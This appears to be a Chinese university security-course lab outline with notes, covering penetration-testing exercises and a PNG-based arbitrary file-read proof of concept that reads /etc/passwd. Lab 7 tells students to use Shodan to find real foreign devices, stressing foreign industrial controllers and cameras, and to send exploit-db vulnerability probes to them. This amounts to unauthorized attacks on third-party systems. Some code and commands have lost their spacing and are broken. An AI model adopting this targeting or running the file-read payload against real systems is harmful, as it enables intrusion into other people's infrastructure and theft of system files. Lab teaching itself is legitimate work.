

| 6 | 渗透测试实操实验                   | 1.一次完整的渗透测试体验2.渗透测试-Metasploit进行漏洞利用3.渗透测试-网络扫描4.渗透测试-Tomcat目录穿越5.渗透测试-Joomla cms反序列化远程代码执行6渗透测试-拒绝服务攻击7.渗透测试-JBoss反序列化漏洞检测 | 0.5周 | 实验室 |
| - | ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----- | ------ |
| 7 | 网络设备扫描工具设计与开发         | 设计并开发工具，完成对指定的联网工控或物联网（如西门子PLC、摄像头）设备的识别，基于此了解漏洞扫描的原理                                                                                              | 1.5周 | 实验室 |
| 8 | 简单模糊测试漏洞挖掘工具设计与开发 | 学习模糊测试漏洞挖掘的原理和方法，采用随机变异/生成的方法构造测试用例，并实现对指定软件的持续发包测试。                                                                                              | 1.5周 | 实验室 |

1）实验6具体要求和步骤

（1）搭建具备漏洞虚拟机环境（可采用之前课程构建的环境，漏洞不限于上表中的要求）

（2）完成一次完整的渗透测试，包括网络扫描（存活性探测、操作系统探测、服务探测、漏洞验证、漏洞利用，工具可采用nmap、metasploit等，不限）

2）实验7具体要求和步骤

参考nmap实现原理，完成以下实验内容：

（1）登录shodon https://www.shodan.io/，查找国外资产（注意**一定找国外资产**，建议优先选择工控设备、摄像头等）的IP作为被探测目标对象。被测资产可以是单个资产也可以是资产列表。

（2）采用多线程/进程方式（建议，如有困难可以单进程单线程）实现任务调度，通过多线程或子进程进行目标存活性探测、端口开放探测、资产版本探测以及构造漏洞测试用例（测试用例即为具体要发送的探测数据包，可以从网络查询获取任一漏洞的探测报文，可参考exploitdb中的漏洞POC），测试漏洞是否存在。


# Description

环境说明：

服务器

```shell

NAME="CentOS Linux"

VERSION="7 (Core)"

ID="centos"

ID_LIKE="rhel fedora"

VERSION_ID="7"

PRETTY_NAME="CentOS Linux 7 (Core)"

ANSI_COLOR="0;31"

CPE_NAME="cpe:/o:centos:centos:7"

HOME_URL="https://www.centos.org/"

BUG_REPORT_URL="https://bugs.centos.org/"


CENTOS_MANTISBT_PROJECT="CentOS-7"

CENTOS_MANTISBT_PROJECT_VERSION="7"

REDHAT_SUPPORT_PRODUCT="centos"

REDHAT_SUPPORT_PRODUCT_VERSION="7"

```

docker 环境说明

```shell

Dockerversion23.0.0,builde92dd87

```

## steps

依据docker环境进行操作

```shell

# 后台创建并运行docker容器

docker-composeup-d

```

使用漏洞扫描工具进行扫描

AWVS

编写脚本将文本文件转换为图片

```python

withopen(to_filename, 'wb') as f:

    f.write(png.signature)

    if from_filename:

        p = png.Reader(filename=from_filename)

        for k, v in p.chunks():

            if k != b'IEND':

                png.write_chunk(f, k, v)

    else:

        png.write_chunk(f, b'IHDR', IHDR)

        png.write_chunk(f, b'IDAT', IDAT)


    png.write_chunk(f, b"tEXt", b"profile\x00" + read_filename.encode())

    png.write_chunk(f, b'IEND', b'')

```

将指定路径下的文本生成图片

```shell
./poc.py generate -o poc.png -r /etc/passwd
```

将该图片上传进行提交，并将生成的新文件进行解析

```shell
./poc.py parse- i out.png
```


# shodan搜索引擎
> 参考链接 https://shodan.readthedocs.io/en/latest/tutorial.html

